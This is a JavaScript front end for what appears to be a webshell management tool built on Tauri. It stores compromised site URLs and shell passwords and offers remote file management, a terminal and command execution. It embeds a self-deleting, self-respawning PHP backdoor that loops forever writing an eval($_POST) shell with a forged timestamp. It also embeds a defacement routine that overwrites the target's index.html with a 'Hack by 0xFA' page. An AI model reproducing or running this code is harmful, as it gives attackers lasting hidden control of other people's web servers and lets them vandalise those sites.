const { invoke } = window.__TAURI__.tauri;
const { event } = window.__TAURI__;

async function updateConnectionInfo() {
  console.log('Updating connection info');
  try {
      const connections = await invoke('get_connection_info');
      console.log('Received connections:', connections);
      const connectionInfoDiv = document.getElementById('connectionInfo');
      if (connections && connections.length > 0) {
          connectionInfoDiv.innerHTML = connections.map(info => `
            <div>
                <h3>URL: ${info.url}</h3>
                <p>连接密码: ${info.password}</p>
                <p>代码语言: ${info.language}</p>
                <p>编码类型: ${info.encoding}</p>
                <p>编码种类: ${info.encoder}</p>
                <p>解码种类: ${info.decoder}</p>
                <button onclick="deleteConnection('${info.id}')">删除shell</button>
                <button onclick='openFileManager(${JSON.stringify(info)})'>文件管理</button>
                <button onclick='openTerminal(${JSON.stringify(info)})'>虚拟终端</button>
                <button onclick='executePhpInfo(${JSON.stringify(info)})'>上传不死马(文件名.test.html,参数test)</button>
                <button onclick='executeBlack(${JSON.stringify(info)})'>上黑页</button>
            </div>
            <hr>
        `).join('');
      } else {
          connectionInfoDiv.innerHTML = '<p>暂未储存可用的shell...</p>';
      }
  } catch (error) {
      console.error('Error fetching connection info:', error);
      document.getElementById('connectionInfo').innerHTML = '<p>Error fetching connection info</p>';
  }
}

async function deleteConnection(id) {
  try {
      await invoke('delete_connection', { id });
      await updateConnectionInfo();
  } catch (error) {
      console.error('Error deleting connection:', error);
      alert('Failed to delete connection. Please try again.');
  }
}

async function openInputWindow() {
  try {
      const windowLabel = await invoke('open_input_window');
      console.log('Opened input window with label:', windowLabel);
      
      // 监听新窗口的关闭事件
      const unlistenFn = await event.listen(`tauri://close-requested`, async (event) => {
          if (event.windowLabel === windowLabel) {
              console.log('Input window closed, updating connection info');
              await updateConnectionInfo();
              // 移除监听器
              await unlistenFn();
          }
      });
  } catch (error) {
      console.error('Error opening input window:', error);
      alert('Failed to open input window. Please try again.');
  }
}

function setupEventListeners() {
  document.querySelector("#myButton").addEventListener("click", openInputWindow);
}

async function init() {
  console.log('Initializing app');
  await updateConnectionInfo();
  setupEventListeners();
}

if (document.readyState === 'loading') {
  document.addEventListener('DOMContentLoaded', init);
} else {
  init();
}

window.deleteConnection = deleteConnection;
window.manualRefresh = updateConnectionInfo;


//shell
async function executeRemoteShell(connectionInfo, command) {
  try {
      const result = await invoke('execute_remote_shell', { connectionInfo, command });
      console.log('Remote shell output:', result);
      return result;
  } catch (error) {
      console.error('Error executing remote shell:', error);
      throw error;
  }
}

// 添加一个函数来处理用户输入和显示结果
window.openCommandExecutor = function(connectionInfo) {
  localStorage.setItem('currentConnection', JSON.stringify(connectionInfo));
  window.location.href = 'command.html';
}




//file
window.openFileManager = function(connectionInfo) {
  localStorage.setItem('currentConnection', JSON.stringify(connectionInfo));
  window.location.href = 'file.html';
}


//terminal
window.openTerminal = function(connectionInfo) {
  console.log('Opening terminal for:', connectionInfo.url);
  try {
      localStorage.setItem('currentConnection', JSON.stringify(connectionInfo));
      window.location.href = 'terminal.html';
  } catch (error) {
      console.error('Error opening terminal:', error);
      alert('Failed to open terminal: ' + error.message);
  }
}

window.onerror = function(message, source, lineno, colno, error) {
  console.error('Global error:', message, 'at', source, lineno, colno, error);
  alert('An error occurred: ' + message);
}

async function executePhpInfo(connectionInfo) {
  const phpCode = `<?php
    ignore_user_abort(true);
    set_time_limit(0);
    unlink(__FILE__);
    while (1){
        file_put_contents('.test.php','<?php @eval(\\$_POST[\\'test\\']) ?>');
        system('touch -m -d \\"2018-12-01 09:10:12\\" .test.php');
        usleep(5000);
    }
?>`;
  const fileName = "test.php";
  try {
      // 创建并上传文件
      await invoke('create_remote_file', { 
          connectionInfo, 
          filePath: fileName,
          content: phpCode
      });
      console.log('PHP file created');

      // 执行文件
      const result = await invoke('execute_remote_shell', { 
          connectionInfo, 
          command: `/usr/bin/php ${fileName}`,
          workingDirectory: '.'
      });
      console.log('PHP Info result:', result);

      // 在新窗口中显示结果
      const resultWindow = window.open('', '_blank');
      resultWindow.document.write(result);
      resultWindow.document.close();

      // 删除文件（可选）
      await invoke('delete_remote_file', {
          connectionInfo,
          filePath: fileName
      });
      console.log('PHP file deleted');

  } catch (error) {
      console.error('Error executing PHP Info:', error);
      alert('Failed to execute PHP Info: ' + error);
  }
}

async function executeBlack(connectionInfo) {
  const phpCode = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>CD</title>
    <style>
        *{box-sizing: border-box;}
        body{
            background: #000;
            margin: 0;
            padding: 0;
            overflow: hidden;
            text-shadow: 0px 0px 80px;
        }
        h1{
            margin: 0;
            padding: 0;
            color: #FF0000;
        }
        a{color: #FF0000;}
        /* 盒子↓ */
        p{
            margin: 0;
        }
        .box{
            /* 盒子宽度↓ ---最好别改*/
            width: 700px;
            /* 让视频居中对齐↓---最好别动 */
            text-align: center;
            /* border: 1px solid #f00; */
            color: #fff;
             
            position: absolute;
            margin: 20px auto 0;
            top: 20px;
            left: 0;
            right: 0;
        }
        /* 图片样式↓ */
 
        img{
            /* 视频宽度↓ ---最好不要大于上面盒子的宽度*/
            width: 700px;
            height: 390px;
            /* 灰色的描边↓ ---px是粗细 solid是实线 #555是颜色代码 可以百度html颜色代码修改*/
            border: 2px solid #222;
            /* 图片的圆角 */
            border-radius: 5px;
            /* 动画时间 */
            transition: 0.8s;
        }
        .img2:hover{border: 2px solid #980b18}
 
        .box>div{
            padding: 20px;
            /* border: 1px solid #f00; */
        }
        .szj{
            position: absolute;
            top: 0;
            left: 0;
            color: #FF0000;
            padding: 5px;
            border: 1px solid #FF0000;
            background-color: rgb(0,0,0,0.7)
        }
        .yl{
            display: inline;
            border-bottom:1px dotted #FF0000;
        }
        .yl a{
            text-decoration: none;
            color:#FF0000;
             
        }
        .yl span{
            margin-right: 8px;
        }
    </style>
</head>
<body>
    <canvas id="canvas"></canvas>
    <div class="box">
        <!-- 图片部分 -->
        <img class="img2" src="http://i1.go2yd.com/image.php?url=0LuCLkmZi9" alt="">
        <div class="text">
            <h1>———Hack by 0xFA———</h1>
 
            <br>
 
            <span style="color: #FF0000">别人黑我，永生难忘；我黑别人，不放心上</span><span><a target="view_window" href="https://www.404v.com/"></a></span>
<br><br>
 
            <p class="glow" style="color: #FF0000; font-size:21px;">———————此网站被黑———————</p>
            <br>
            <span style="color: #FF0000">只有黑出来的美丽 没有等出来的辉煌</span><span><a  style="color: #FF0000;" target="view_window" href="http://wpa.qq.com/msgrd?v=3&uin=49000185&site=qq&menu=yes"></a></span>
            <br><br>
            <P class="glow">—–—安全之路，永不妥协—–—</P>
<br><br><br><br>
            <div>
        </div>
     
 
    <!-- 音乐部分 -->
    <embed height="0" width="0" src="https://music.163.com/outchain/player?type=2&id=29400926&auto=1&height=66"></embed>
 
     
 
 
    <!-- 以下js -->
 
 
    <script>
    var canvas = document.getElementById('canvas');
        var ctx = canvas.getContext('2d');
 
 
        canvas.height = window.innerHeight;
        canvas.width = window.innerWidth;
        // 下面的fddsidgnvaieighaodgdg就是代码雨的文字
        var texts = 'fddsidgnvaieighaodgdg'.split('');
 
        var fontSize = 16;
        var columns = canvas.width/fontSize;
        // 用于计算输出文字时坐标，所以长度即为列数
        var drops = [];
        //初始值
        for(var x = 0; x < columns; x++){
            drops[x] = 1;
        }
 
        function draw(){
            //让背景逐渐由透明到不透明
            ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            //文字颜色
            ctx.fillStyle = '#0F0';
            ctx.font = fontSize + 'px arial';
            //逐行输出文字
            for(var i = 0; i < drops.length; i++){
                var text = texts[Math.floor(Math.random()*texts.length)];
                ctx.fillText(text, i*fontSize, drops[i]*fontSize);
 
                if(drops[i]*fontSize > canvas.height || Math.random() > 0.95){
                    drops[i] = 0;
                }
 
                drops[i]++;
            }
        }
    setInterval(draw, 33);
</script>
</body>
</html>`;
  const code = `<script>window.location.href = "black.html";</script>`;
  const fileName = "black.html";
  const index_Name = "index.html";
  try {
      // 创建并上传文件
      await invoke('create_remote_file', { 
          connectionInfo, 
          filePath: fileName,
          content: phpCode
      });
      console.log('PHP file created');
      await invoke('create_remote_file', { 
        connectionInfo, 
        filePath: index_Name,
        content: code
      });
      console.log('PHP file created');
  } catch (error) {
      console.error('Error executing PHP Info:', error);
      alert('Failed to execute PHP Info: ' + error);
  }
}


// 将函数添加到 window 对象，使其可以从 HTML 中调用
window.executePhpInfo = executePhpInfo;
window.executeBlack = executeBlack;